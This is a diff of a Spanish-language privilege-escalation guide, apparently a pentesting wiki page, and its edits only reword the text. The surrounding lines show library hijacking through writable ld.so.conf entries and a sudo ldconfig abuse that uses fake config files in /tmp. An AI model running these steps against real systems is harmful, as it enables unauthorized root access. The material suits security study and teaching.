@@ -69,7 +69,7 @@ puts("Hi");
 
 ### Verifica el entorno
 
-Verifica que _libcustom.so_ esté siendo **cargada** desde _/usr/lib_ y que puedas **ejecutar** el binario.
+Verifica que _libcustom.so_ esté siendo **cargado** desde _/usr/lib_ y que puedas **ejecutar** el binario.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -113,7 +113,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-Como puedes ver, **lo está cargando desde `/home/ubuntu/lib`** y si algún usuario lo ejecuta, se ejecutará un shell:
+Como puedes ver, está **cargándolo desde `/home/ubuntu/lib`** y si algún usuario lo ejecuta, se ejecutará un shell:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -128,20 +128,20 @@ Nota que en este ejemplo no hemos escalado privilegios, pero modificando los com
 ### Otras configuraciones incorrectas - Misma vulnerabilidad
 
 En el ejemplo anterior simulamos una configuración incorrecta donde un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración dentro de `/etc/ld.so.conf.d/`**.\
-Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad; si tienes **permisos de escritura** en algún **archivo de configuración** dentro de `/etc/ld.so.conf.d`, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf`, puedes configurar la misma vulnerabilidad y explotarla.
+Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad; si tienes **permisos de escritura** en algún **archivo de configuración** dentro de `/etc/ld.so.conf.d`, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf` puedes configurar la misma vulnerabilidad y explotarla.
 
 ## Exploit 2
 
 **Supón que tienes privilegios de sudo sobre `ldconfig`**.\
 Puedes indicar a `ldconfig` **dónde cargar los archivos de configuración**, así que podemos aprovechar esto para hacer que `ldconfig` cargue carpetas arbitrarias.\
-Así que, vamos a crear los archivos y carpetas necesarios para cargar "/tmp":
+Entonces, vamos a crear los archivos y carpetas necesarios para cargar "/tmp":
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Ahora, como se indica en la **explotación anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
-Y finalmente, carguemos la ruta y verifiquemos de dónde está cargando el binario la biblioteca:
+Ahora, como se indica en el **exploit anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
+Y finalmente, carguemos la ruta y verifiquemos de dónde se está cargando el binario:
 ```bash
 ldconfig -f fake.ld.so.conf
 
